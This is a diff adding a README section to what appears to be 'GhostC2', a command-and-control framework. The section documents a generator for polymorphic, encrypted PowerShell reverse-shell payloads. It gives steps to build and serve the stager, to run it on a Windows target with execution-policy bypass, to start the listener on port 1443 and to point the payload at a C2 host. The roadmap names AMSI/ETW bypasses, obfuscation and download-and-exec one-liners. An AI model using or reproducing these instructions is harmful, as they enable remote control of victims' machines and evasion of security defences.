@@ -166,6 +166,89 @@ Useful for:
 
 ---
 
+## 🔧 PowerShell Payload Generator
+
+GhostC2 now supports polymorphic PowerShell reverse shell payloads for Windows agents.
+
+### ✅ Features:
+- Encrypted TCP reverse shell using `System.Net.Sockets.TcpClient`
+- Randomized variable names per build
+- Auto-appended `PS C:\>`-style prompt
+- Compatible with manual execution or droppers
+- Optionally served via `/generate_ps_payload`
+
+---
+
+### 🧪 Generating a PowerShell Payload
+
+To generate a `.ps1` stager:
+
+1. Run the Flask server:
+   ```bash
+   python3 server/app.py
+   ```
+
+2. Navigate to the dashboard and click:
+   **“Generate PowerShell Payload”**
+
+3. The generated payload will be saved to:
+   ```
+   /server/payloads/ps_payload_<timestamp>.ps1
+   ```
+
+4. It will be automatically served for download.
+
+---
+
+### 🔌 Running the Payload on Target
+
+Run the payload on a Windows target using:
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process -Force
+.\ps_payload_20250517_XXXXXX.ps1
+```
+
+> ⚠️ Ensure `ps_handler.py` is running and listening on port `1443`:
+```bash
+sudo python3 server/ps_handler.py
+```
+
+---
+
+### 🧼 Customizing the Payload
+
+To change the default connection host/port:
+
+Edit `tools/ps_builder.py`:
+
+```python
+host = "YOUR_C2_IP"
+port = 1443
+```
+
+---
+
+### 📁 Payload Directory Structure
+
+Generated payloads are stored in:
+```
+server/payloads/
+```
+
+They are automatically served via Flask using:
+```python
+send_from_directory('payloads', filename)
+```
+
+---
+
+### 🧠 Roadmap
+- `.hta`, `.bat`, and `.vbs` wrappers
+- AMIS/ETW bypass options
+- Obfuscation toggle
+- Dashboard-based one-liners for download & exec
+
 ## 🔐 Security Notes
 
 - AES-encrypted traffic throughout
